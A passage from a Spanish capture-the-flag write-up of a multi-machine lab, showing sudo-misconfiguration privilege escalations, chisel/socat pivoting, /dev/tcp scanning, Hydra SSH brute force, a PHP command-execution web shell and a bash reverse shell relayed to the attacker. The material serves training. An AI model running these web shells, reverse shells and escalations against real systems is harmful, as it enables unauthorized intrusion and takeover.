    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User freddy may run the following commands on 4009973a2306:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
```

Parece que podemos ejecutar este script de Python como **cualquier** usuario, incluso como el usuario **root**.

Entonces, veamos si podemos leer o modificar este script de Python.

```
┌──(freddy㉿4009973a2306)-[/opt]
└─$ ls -l maintenance.py 
-rw-r--r-- 1 freddy freddy 35 Mar 29  2024 maintenance.py
```

¡Y somos propietarios de este script de Python! Podemos leer y modificar el contenido.

```python
┌──(freddy㉿4009973a2306)-[/opt]
└─$ cat maintenance.py 
import os

os.system("bash")
```

¡Vamos a cambiar el contenido usando la librería os para ejecutar un shell como el usuario root!

```
┌──(freddy㉿4009973a2306)-[/opt]
└─$ sudo python3 /opt/maintenance.py 
┌──(root㉿4009973a2306)-[/opt]
└─# whoami
root
```

¡Ahora somos root! **PWNED!**

---

# Creando un túnel desde Move hacia Trust

Si observamos las interfaces de red, podemos ver esto:

```
┌──(root㉿4009973a2306)-[/opt]
└─# hostname -i
20.20.20.3 30.30.30.2
```

Podemos usar nuestro propio mini escáner que hicimos anteriormente.

Pero en este caso, este sistema no tiene el comando **ping** para encontrar otros hosts.

Así que cambié a algo como esto:

```bash
#!/bin/bash

for num in {1..254}; do
        echo "" 2>/dev/null > /dev/tcp/30.30.30.$num/22 && echo "[+] The host 30.30.30.$num is ACTIVE" &
done
```

Así que estamos asumiendo que el puerto 22 está abierto en la máquina a la que estamos intentando alcanzar.

```
┌──(root㉿93327e482a4b)-[~]
└─# bash scan.sh 
[+] The host 30.30.30.2 is ACTIVE
[+] The host 30.30.30.3 is ACTIVE
```

¡Y encontramos la dirección IP de la otra máquina! Podemos usar nuevamente nuestro mini escáner para intentar encontrar qué puertos están abiertos en la otra máquina.

```
┌──(root㉿93327e482a4b)-[~]
└─# bash scan.sh 
[+] The port 22 is OPEN
[+] The port 80 is OPEN
```

2 puertos abiertos, así que vamos a crear otro túnel para alcanzar la máquina **Trust**.

Pero antes de hacer esto, necesitamos usar **socat** en la máquina **Inclusion** para redirigir el tráfico hacia nosotros. Es bastante difícil de describir, así que primero necesitamos transferir **socat** a Inclusion, más específicamente un binario estático o vamos a tener algunos problemas con el sistema.

Lo descargué desde aquí.

Una vez que hacemos esto, les damos permisos de **ejecución** y transferimos con **scp**.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/Trust]
└─$ scp socat manchi@10.10.10.2:/tmp
manchi@10.10.10.2's password: 
socat
```

Luego ejecutamos el siguiente comando en Inclusion:

```
root@525db093c118:/tmp# ./socat TCP-LISTEN:1111,fork tcp:192.168.0.20:1234 &
```

Así que la máquina **Inclusion** va a estar en modo escucha en el puerto **1111** y si recibe tráfico, vamos a enviarlo de vuelta a nuestra máquina de ataque, nuestro servidor de **chisel**.

Bien, así que con la máquina **Move** ahora podemos transferir chisel a ella.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/Trust]
└─$ sudo proxychains -q scp /usr/bin/chisel freddy@20.20.20.3:/tmp 
freddy@20.20.20.3's password: 
chisel
```

Vamos a hacer la conexión con **chisel** desde la máquina **Move** a **Inclusion**, y la máquina **Inclusion** va a redirigir el tráfico hacia nosotros.

```
┌──(root㉿93327e482a4b)-[/tmp]
└─# ./chisel client 20.20.20.2:1111 R:1111:socks &
2025/12/16 17:09:17 client: Connecting to ws://20.20.20.2:1111
2025/12/16 17:09:17 client: Connected (Latency 746.351µs)
```

Y en nuestro servidor chisel recibimos esto:

```
2025/12/16 12:09:17 server: session#2: tun: proxy#R:127.0.0.1:1111=>socks: Listening
```

¡Obtenemos la conexión de la máquina **Move!**

Y también necesitamos agregar al final del **archivo de configuración de proxychains** esto:

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/Trust]
└─$ tail -n 2 /etc/proxychains4.conf 
socks5 127.0.0.1 1111
socks5 127.0.0.1 1080
```

Por cada acceso que obtenemos, lo ordenamos por cada nueva conexión que recibimos.

---

# Reconocimiento Trust

Entonces, hagamos un escaneo para ver qué puertos están abiertos en **Trust**.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/Trust]
└─$ sudo proxychains -q nmap --top-ports 1000 -sT -Pn -n --min-rate 5000 30.30.30.3 -vv 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-16 12:18 -05
Initiating Connect Scan at 12:18
Scanning 30.30.30.3 [1000 ports]
Discovered open port 22/tcp on 30.30.30.3
Discovered open port 80/tcp on 30.30.30.3
Completed Connect Scan at 12:19, 44.61s elapsed (1000 total ports)
Nmap scan report for 30.30.30.3
Host is up, received user-set (0.044s latency).
Scanned at 2025-12-16 12:18:35 -05 for 45s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 44.76 seconds
```

Entonces, vamos a hacer otro escaneo nmap por estos 2 puertos, para descubrir qué servicios y versiones se están ejecutando.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/Trust]
└─$ sudo proxychains -q nmap -p22,80 -sT -Pn -n -sCV 30.30.30.3 -oX target --stats-every=1m
```

Luego, convertiremos este archivo XML a HTML.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/Trust]
└─$ xsltproc target -o target.html
```

Y abriremos el archivo.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/Trust]
└─$ open target.html
```

![Screenshot](/hard/BigPivoting/Images/image11.png)

Bien, podemos ver otro sitio web aquí, así que hagamos otro proxy con **foxyproxy** para poder ver la página.

![Screenshot](/hard/BigPivoting/Images/image12.png)

Una vez que lo configuremos correctamente, activemos el proxy y visitemos el sitio web.

![Screenshot](/hard/BigPivoting/Images/image13.png)

¡Y podemos ver la página!

Pero si intentamos enumerar el contenido del sitio web con **ffuf** o **gobuster**, una vez más, será muy lento con **proxychains**.

---

# Explotación Trust

Entonces, necesitamos crear nuestra propia herramienta de enumeración con Python.

```python
from pwn import *
import requests
import sys
import signal

dictionary = "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt"

def send_request(payload):
        target = f"http://30.30.30.3/{payload}"

        response = requests.get(url=target)

        if response.status_code != 404:
                log.info(f'"{payload}" exists on the website.')


with log.progress("Getting content...") as bar:
        try:
                with open(dictionary) as file:
                        for line in file:

                                if "#" in line or not line: continue
                                convert = str(line).strip()

                                php = convert + ".php"
                                html = convert + ".html"

                                send_request(php)
                                bar.status(f"Trying with {php}...")
                                send_request(html)
                                bar.status(f"Trying with {html}...")
                                send_request(convert)
                                bar.status(f"Trying with {convert}...")

        except KeyboardInterrupt:
                log.warn("QUITTING...")
                bar.success("Finished.")
                sys.exit(0)
```

Con este script vamos a enumerar posibles archivos **html** o **php**, y si recibimos un código de estado distinto de 404 (no encontrado), el script va a imprimir que el archivo o directorio existe.

---

# Enumeración Trust

Entonces, ejecutémoslo ahora.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/Trust]
└─$ sudo proxychains -q python3 enumeration.py
[+] Getting content...: Finished.
[*] ".php" exists on the website.
[*] ".html" exists on the website.
[*] "" exists on the website.
[*] "index.html" exists on the website.
[*] "secret.php" exists on the website.
^C[!] QUITTING..
```

Y encontramos **"secret.php"**, vamos a echar un vistazo en nuestro navegador.

![Screenshot](/hard/BigPivoting/Images/image14.png)

Esto es lo que encontramos, parece que existe un usuario **mario**. Después de una larga enumeración, solo puedo intentar hacer un ataque de fuerza bruta con **hydra** en **ssh**.

Entonces voy a probar si funciona...

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/Trust]
└─$ sudo proxychains -q hydra -t 16 -l mario -P /usr/share/wordlists/rockyou.txt ssh://30.30.30.3
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-16 13:26:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, ~896525 tries per task
[DATA] attacking ssh://30.30.30.3:22/
[22][ssh] host: 30.30.30.3   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-16 13:26:39
```

¡Y encontramos la contraseña de **mario**!

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/Trust]
└─$ sudo proxychains -q ssh mario@30.30.30.3
The authenticity of host '30.30.30.3 (30.30.30.3)' can't be established.
ED25519 key fingerprint is: SHA256:z6uc1wEgwh6GGiDrEIM8ABQT1LGC4CfYAYnV4GXRUVE
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '30.30.30.3' (ED25519) to the list of known hosts.
mario@30.30.30.3's password: 
Linux 2fdace02ac59 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Mar 20 09:54:46 2024 from 192.168.0.21
mario@2fdace02ac59:~$
```

---

# Escalada de privilegios Trust

Cuando ejecutamos **sudo -l**, vemos que tenemos privilegios de **SUDOER**.

```
mario@2fdace02ac59:~$ sudo -l
[sudo] password for mario: 
Matching Defaults entries for mario on 2fdace02ac59:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 2fdace02ac59:
    (ALL) /usr/bin/vim
```

Podemos ejecutar **vim** como cualquier usuario, incluso como root.

Así que vamos a ejecutar los siguientes comandos:

```
mario@2fdace02ac59:~$ sudo vim
```

Y luego este:

```
:!/bin/bash
```

Y así ganamos una shell como el usuario root.

```
mario@2fdace02ac59:~$ sudo vim
[sudo] password for mario: 

root@2fdace02ac59:/home/mario# whoami
root
```

**PWNED!**

---

# Creando un túnel desde Trust hacia Upload

Veamos las interfaces de red que tenemos en el sistema.

```
root@2fdace02ac59:~# hostname -i
30.30.30.3 40.40.40.2
```

Como podemos ver, necesitamos saber cuál es la dirección IP de la otra máquina. Podemos hacer esto una vez más con nuestra herramienta mini escáner que hicimos antes.

```
root@2fdace02ac59:~# bash scan.sh 
[+] The host 40.40.40.2 is ACTIVE
[+] The host 40.40.40.3 is ACTIVE
```

Encontramos la máquina, ahora vamos a intentar buscar qué puertos están abiertos.

```
root@2fdace02ac59:~# bash scan.sh 
[+] The port 80 is OPEN
```

Solo el puerto http, vamos a crear otro túnel con **chisel** y **socat** como expliqué antes.

Entonces necesitamos transferir **socat** a la máquina **Move**.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/Trust]
└─$ sudo proxychains -q scp socat freddy@20.20.20.3:/tmp
freddy@20.20.20.3's password: 
socat
```

Luego, pongámonos en modo escucha con **socat** para redirigir cualquier tráfico que reciba esta máquina hacia la máquina **Inclusion**.

```
┌──(root㉿93327e482a4b)-[/tmp]
└─# ./socat TCP-LISTEN:2222,fork tcp:20.20.20.2:1111 &
```

Y luego, transferiremos **chisel** a la máquina **Trust**.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/files/Trust]
└─$ sudo proxychains -q scp /usr/bin/chisel mario@30.30.30.3:/tmp
mario@30.30.30.3's password: 
chisel
```

Entonces, intentemos conectar **chisel** desde **Trust** a **Move**.

```
root@2fdace02ac59:~# ./chisel client 30.30.30.2:2222 R:2222:socks &
root@2fdace02ac59:~# 2025/12/16 19:18:29 client: Connecting to ws://30.30.30.2:2222
2025/12/16 19:18:29 client: Connected (Latency 1.719686ms)
```

Y recibimos esto en nuestro servidor chisel:

```
2025/12/16 14:18:29 server: session#3: tun: proxy#R:127.0.0.1:2222=>socks: Listening
```

¡Así que hemos creado con éxito el túnel!

Pero no olvidemos añadir la conexión al archivo de configuración de proxychains.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/bigpivoting/enumeration]
└─$ tail -n 3 /etc/proxychains4.conf 
socks5 127.0.0.1 2222
socks5 127.0.0.1 1111
socks5 127.0.0.1 1080
```

---

# Reconocimiento Upload

Hagamos ahora un escaneo nmap.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/Upload]
└─$ sudo proxychains -q nmap --top-ports 1000 -sT -Pn -n --min-rate 5000 -vv 40.40.40.3
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-16 14:26 -05
Initiating Connect Scan at 14:26
Scanning 40.40.40.3 [1000 ports]
Discovered open port 80/tcp on 40.40.40.3
Completed Connect Scan at 14:27, 48.13s elapsed (1000 total ports)
Nmap scan report for 40.40.40.3
Host is up, received user-set (0.048s latency).
Scanned at 2025-12-16 14:26:48 -05 for 48s
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 48.28 seconds
```

Solo el puerto 80, hagamos otro escaneo nmap para conocer servicios y versiones.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/Upload]
└─$ sudo proxychains -q nmap -p80 -sT -Pn -n -sCV 40.40.40.3
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-16 14:29 -05
Nmap scan report for 40.40.40.3
Host is up (0.096s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Upload here your file
|_http-server-header: Apache/2.4.52 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.44 seconds
```

En este caso no voy a usar HTML para ver los resultados, podemos ver que podemos subir un archivo aquí.

Vamos a añadir de nuevo otro proxy en foxyproxy.

![Screenshot](/hard/BigPivoting/Images/image15.png)

Vamos a usarlo y ver la página.

![Screenshot](/hard/BigPivoting/Images/image16.png)

Parece que podemos subir cualquier cosa, así que voy a subir un archivo php que pueda ejecutar comandos en el sistema.

```php
<?php
system($_GET["cmd"]);
?>
```

Así que voy a subir este archivo.

![Screenshot](/hard/BigPivoting/Images/image17.png)

---

# Enumeración Upload

Pero no sabemos el directorio que guarda los archivos, así que voy a usar una vez más mi herramienta de enumeración.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/Upload]
└─$ sudo proxychains -q python3 enumeration.py 
[+] Getting content...: Finished.
[*] ".php" exists on the website.
[*] ".html" exists on the website.
[*] "/" exists on the website.
[*] "index.html" exists on the website.
[*] "icons/" exists on the website.
[*] "uploads/" exists on the website.
[*] "upload.php" exists on the website.
```

Y encontramos el directorio **uploads**, probablemente contiene nuestro archivo.

![Screenshot](/hard/BigPivoting/Images/image18.png)

---

# Explotación Upload

Y podemos confirmarlo, así que vamos a inyectar nuestra payload.

![Screenshot](/hard/BigPivoting/Images/image19.png)

Y obtenemos una RCE, quiero hacer una shell inversa pero necesito redirigir todo el tráfico a nuestra máquina, así que necesitamos usar de nuevo **chisel** desde la máquina **Trust** porque vamos a hacer una shell inversa que vaya desde **Trust** al túnel que hicimos con las otras máquinas y finalmente llegar a nosotros.

Entonces, una vez más, usemos **chisel** en la máquina **Trust**.

```
root@dba4ee2b9f1f:~# ./chisel client 30.30.30.2:2222 3333:192.168.0.20:3131 &
```

Con este comando estamos haciendo que cualquier tráfico que entre en el puerto 3333 desde la máquina **Trust** sea redirigido a nosotros en el puerto 3131.

Entonces, en nuestra máquina de ataque, pongámonos en modo escucha con **netcat**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil/bigpivoting]
└─$ nc -lvnp 3131
listening on [any] 3131 ..
```

**-l** <- Este argumento hace que netcat esté en modo escucha.

**-v** <- Este argumento activa el modo **verbose**, esto nos mostrará con más detalle la conexión que recibimos.

**-n** <- Esto hace que netcat omita la búsqueda DNS, y solo use la dirección IP directamente.

**-p** <- El puerto en el que estamos escuchando, puede ser cualquier puerto que no esté siendo usado actualmente.

Bien, entonces vamos a hacer una shell inversa desde la máquina **Upload** a la máquina **Trust** y finalmente en nuestra máquina ganando la shell.

Entonces, ejecutemos el siguiente comando en la máquina **Upload**:

- **bash -c 'bash -i >%26 /dev/tcp/40.40.40.2/3333 0>%261'**

En resumen, con este comando estamos haciendo una shell interactiva con la máquina **Trust** si recordamos que todo el tráfico que recibe la máquina **Trust** finalmente llega a nosotros.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil/bigpivoting]
└─$ nc -lvnp 3131
listening on [any] 3131 ...
connect to [192.168.0.20] from (UNKNOWN) [192.168.0.20] 45822
bash: cannot set terminal process group (25): Inappropriate ioctl for device
bash: no job control in this shell
www-data@64d173908366:/var/www/html/uploads$
```

¡Y exitosamente ganamos acceso desde la máquina **Upload**!

---

### Modificación de la shell

Pero necesitamos modificar esta shell para que funcione adecuadamente.

Primero, ejecutamos esto:

```
www-data@64d173908366:/var/www/html/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
```

Este comando crea una nueva sesión de bash con **script** y **/dev/null** como archivo de salida, porque script registra cada comando que ejecutamos en un log, pero con la ruta /dev/null, hacemos que ese registro no pueda grabar comandos, y **-c bash** hace que script ejecute la shell con bash.

Lo hacemos porque queremos usar CTRL + C y más funciones de bash.

Cuando ejecutamos esto, suspendemos nuestra shell inversa por un momento.

Luego, ejecutamos el siguiente comando en nuestra máquina de ataque:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil/bigpivoting]
└─$ stty raw -echo; fg
```

Este comando hace que stty trate la terminal.

**raw** <- Con raw estamos haciendo que todos los datos de entrada y salida sean en formato crudo.

**-echo** <- Con esto estamos haciendo que si ejecutamos un comando, no se imprima de nuevo en la salida.

**; fg** <- Y con esto reanudamos nuestra shell inversa de nuevo.

Cuando ejecutamos este comando, reseteamos el xterm:

```
reset xterm
```

Esto va a resetear la terminal.

Si queremos limpiar nuestra terminal, no podemos porque el término será diferente del xterm, que tiene esta función. Podemos hacerlo de la siguiente manera para poder limpiar nuestra pantalla si se pone fea:

```
www-data@64d173908366:/var/www/html/uploads$ export TERM=xterm
```

Y una última cosa, si notamos que la pantalla de la terminal es muy pequeña!

Podemos ajustarla para que sea más grande con el siguiente comando:

```
www-data@64d173908366:/var/www/html/uploads$ stty rows {num} columns {num}
```

Y finalmente se ve mucho mejor!

---

# Escalada de privilegios Upload

Cuando ejecutamos **sudo -l**, vemos que tenemos privilegios de **SUDOER**

```
www-data@64d173908366:/$ sudo -l
Matching Defaults entries for www-data on 64d173908366:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on 64d173908366:
    (root) NOPASSWD: /usr/bin/env
```

Podemos ver que el usuario **root** puede ejecutar el comando **env**, básicamente este comando puede ejecutar otros comandos en un entorno controlado.

Así que podemos ejecutar el siguiente comando para ganar una shell como el usuario **root**:

```
www-data@64d173908366:/$ sudo env bash
root@64d173908366:/# whoami
root
```

¡Y finalmente somos root en la máquina **Upload**! ***...pwned..!***

---

# Creando un túnel desde Upload hacia WhereIsMywebshell

Podemos comprobar las interfaces de red que tiene la máquina **Upload**.

```
root@64d173908366:~# hostname -i
40.40.40.3 50.50.50.2
```

Podemos usar nuestro mini escáner para buscar cuál es la dirección de la otra máquina.

```
root@64d173908366:~# bash scan.sh 
[+] The host 50.50.50.2 is ACTIVE
[+] The host 50.50.50.3 is ACTIVE
```

Así que encontramos la dirección de la otra máquina, vamos a buscar de nuevo qué puertos están abiertos con nuestro mini escáner.

```
root@64d173908366:~# bash scan.sh 
[+] The port 22 is OPEN
[+] The port 80 is OPEN
```

Podemos ver que hay 2 puertos abiertos.

Pero también necesitamos chisel en la máquina Upload para hacer el túnel desde la otra máquina y ganar acceso.

Pero tenemos un problema, que no podemos transferir directamente chisel desde nuestra máquina de ataque a la máquina Upload.

Así que necesitamos que la máquina **Trust** transfiera **chisel**.

Entonces, con la primera máquina **Trust**, hagamos un servidor python para que la máquina **Upload** pueda obtener las herramientas con **wget**.

```
root@dba4ee2b9f1f:~# python3 -m http.server 100 
Serving HTTP on 0.0.0.0 port 100 (http://0.0.0.0:100/) ...
```

Y con la máquina Upload, descarguemos chisel con wget.

```
root@64d173908366:~# wget http://40.40.40.2:100/chisel
--2025-12-22 05:40:27--  http://40.40.40.2:100/chisel
Connecting to 40.40.40.2:100... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10240184 (9.8M) [application/octet-stream]
Saving to: 'chisel'

chisel                                                      100%[========================================================================================================================================>]   9.77M  --.-KB/s    in 0.07s   

2025-12-22 05:40:27 (133 MB/s) - 'chisel' saved [10240184/10240184]
```

Bien, así que con la máquina **Trust** necesitamos usar **socat** para recibir el tráfico de **chisel**.

```
root@dba4ee2b9f1f:~# ./socat TCP-LISTEN:4444,fork tcp:30.30.30.2:2222 &
```

Y finalmente, usemos chisel desde **Upload** para hacer el túnel.

```
root@64d173908366:~# ./chisel client 40.40.40.2:4444 R:4444:socks &
```

Y en nuestro **servidor chisel** recibimos esto:

```
2025/12/21 23:45:55 server: session#6: tun: proxy#R:127.0.0.1:4444=>socks: Listening
```

Bien, así que vamos a cambiar una vez más nuestro archivo de configuración de proxychains.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil/bigpivoting]
└─$ tail -n4 /etc/proxychains4.conf 
socks5 127.0.0.1 4444
socks5 127.0.0.1 2222
socks5 127.0.0.1 1111
socks5 127.0.0.1 1080
```

Bien, así que ganamos acceso completo desde la máquina **WhereIsMywebshell**!

---

# Reconocimiento WhereIsMywebshell

Vamos a usar **nmap** como siempre.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/WhereIsMywebshell]
└─$ sudo proxychains -q nmap --top-ports 1000 -sT -Pn -n 50.50.50.3 --min-rate 5000 -vv
[sudo] password for craft: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-22 00:06 -05
Initiating Connect Scan at 00:06
Scanning 50.50.50.3 [1000 ports]
Discovered open port 22/tcp on 50.50.50.3
Discovered open port 80/tcp on 50.50.50.3
Completed Connect Scan at 00:07, 49.13s elapsed (1000 total ports)
Nmap scan report for 50.50.50.3
Host is up, received user-set (0.049s latency).
Scanned at 2025-12-22 00:06:48 -05 for 49s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 49.31 seconds
```

2 puertos abiertos, así que vamos a escanear qué servicios y versiones están ejecutándose.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/enumeration/WhereIsMywebshell]
└─$ sudo proxychains -q nmap -sT -Pn -n -p22,80 -sCV 50.50.50.3 -oX target
```

Bien, entonces cambiemos el formato a HTML.

![Screenshot](/hard/BigPivoting/Images/image20.png)

Parece que tenemos un sitio web, así que vamos a echarle un vistazo con el navegador.

Pero recuerda que necesitamos añadir un proxy en **proxychains** para ver el sitio web.

![Screenshot](/hard/BigPivoting/Images/image21.png)

Así que lo guardamos y vamos a echarle un vistazo.

![Screenshot](/hard/BigPivoting/Images/image22.png)

Y podemos ver esto, pero necesitamos enumerar más sobre este sitio web, así que necesitamos usar nuestra herramienta de Python, recuerda que **gobuster** y **ffuf** no funcionan muy bien con proxychains.

---

# Enumeración WhereIsMywebshell

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/WhereIsMywebshell]
└─$ sudo proxychains -q python3 enumeration.py
[◑] Enumerating content...: Trying with ew...
[!] ".php" exists on the website.
[!] ".html" exists on the website.
[!] "" exists on the website.
[!] "index.html" exists on the website.
[!] "shell.php" exists on the website.
[!] "warning.html" exists on the website.
```

Así que encontramos algo interesante, **shell.php** y **warning.html**

Vamos a echarle un vistazo primero a **warning.html**

![Screenshot](/hard/BigPivoting/Images/image23.png)

---

# Explotación WhereIsMywebshell

Parece que shell.php necesita un parámetro, para ejecutar comandos, así que necesitamos modificar un poco nuestra herramienta de enumeración.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/WhereIsMywebshell]
└─$ sudo proxychains -q python3 enumeration.py
[+] Enumerating parameters...: PWNED!
[!] "parameter" was found!
[!] QUITTING
```

Parece que lo encontramos!

![Screenshot](/hard/BigPivoting/Images/image24.png)

¡Obtuvimos éxito!

Así que necesitamos una vez más hacer un túnel chisel para recibir una shell inversa.

Entonces ejecutamos el siguiente comando para recibir tráfico desde el puerto 5555 en la máquina **Upload** hasta nuestra máquina en el puerto 5151.

```
root@5eeb598076b6:~# ./chisel client 40.40.40.2:4444 5555:192.168.0.20:5151 &
```

Así que vamos a usar una vez más nuestra payload para ganar acceso.

```
┌──(craft㉿kali)-[~/…/dificil/bigpivoting/exploits/WhereIsMywebshell]
└─$ nc -lvnp 5151
listening on [any] 5151 ...
connect to [192.168.0.20] from (UNKNOWN) [192.168.0.20] 40268
bash: cannot set terminal process group (23): Inappropriate ioctl for device
bash: no job control in this shell
www-data@6ceae57cb312:/var/www/html$
```

¡Estamos dentro!

Entonces necesitamos modificar esta shell para que funcione adecuadamente, puedes hacer el mismo proceso que hicimos antes como [aquí](#modificación-de-la-shell)

---

# Escalada de privilegios WhereIsMywebshell

Hay una parte donde el sitio web nos dice que algo está oculto en el directorio **/tmp/**.

```
www-data@6ceae57cb312:/$ ls -la tmp
total 12
drwxrwxrwt 1 root root 4096 Dec 22 18:01 .
drwxr-xr-x 1 root root 4096 Dec 22 18:01 ..
-rw-r--r-- 1 root root   21 Apr 12  2024 .secret.txt
```

Podemos ver un archivo aquí, así que vamos a echarle un vistazo.

```
www-data@6ceae57cb312:/$ cat /tmp/.secret.txt 
contraseñaderoot123
```

¡Es la contraseña de **root**!

```
www-data@6ceae57cb312:/$ su
Password: 
root@6ceae57cb312:/# whoami
root
```

Y finalmente somos root en todas las máquinas!

- Inclusion -> **PWNED!**
- Move -> **PWNED!**
- Trust -> **PWNED!**
- Upload -> **PWNED!**
- WhereIsMywebshell -> **PWNED!**
